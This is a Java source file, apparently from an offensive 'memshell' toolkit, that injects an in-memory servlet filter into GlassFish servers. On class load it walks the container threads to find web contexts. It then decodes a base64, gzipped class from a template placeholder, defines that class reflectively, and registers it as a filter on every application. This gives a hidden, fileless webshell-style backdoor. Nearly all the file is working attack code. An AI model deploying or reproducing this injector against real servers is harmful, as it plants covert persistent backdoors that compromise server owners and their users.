package com.reajason.javaweb.memshell.glassfish.injector;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.logging.Logger;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class GlassFishFilterInjector {
    Logger log = Logger.getLogger(GlassFishFilterInjector.class.getName());

    static {
        new GlassFishFilterInjector();
    }

    public GlassFishFilterInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getShell(context);
                inject(context, filter);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public List<Object> getContext() throws Exception {
        List<Object> contexts = new ArrayList<Object>();
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", new Class[0], new Object[0]);
        for (Thread thread : threads) {
            if (thread.getName().contains("ContainerBackgroundProcessor")) {
                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                for (Object key : childrenMap.keySet()) {
                    Map<?, ?> children = (Map<?, ?>) getFieldValue(childrenMap.get(key), "children");
                    for (Object key1 : children.keySet()) {
                        Object context = children.get(key1);
                        if (context != null) {
                            contexts.add(context);
                        }
                    }
                }
            }
        }
        return contexts;
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        Object obj;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            obj = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            obj = clazz.newInstance();
        }
        return obj;
    }

    @SuppressWarnings("unchecked")
    public void inject(Object context, Object filter) throws Exception {
        String filterName = getClassName();
        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
            log.warning("filter already exists");
            return;
        }
        Object filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
        Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
        invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
        invokeMethod(filterDef, "setFilterClass", new Class[]{Class.class}, new Object[]{filter.getClass()});
        invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
        invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
        invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
        try {
            invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
        } catch (Exception e) {
            invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass(), boolean.class}, new Object[]{filterMap, false});
        }

        Constructor<?>[] constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
        constructors[0].setAccessible(true);
        Object filterConfig = constructors[0].newInstance(context, filterDef);
        HashMap<String, Object> filterConfigs = (HashMap<String, Object>) getFieldValue(context, "filterConfigs");
        filterConfigs.put(filterName, filterConfig);
        log.info("filter added successfully");
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;

        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
        } finally {
            if (gzipInputStream != null) {
                try {
                    gzipInputStream.close();
                } catch (IOException ignored) {
                }
            }
            out.close();
        }
        return out.toByteArray();
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = getField(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }

            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }
}
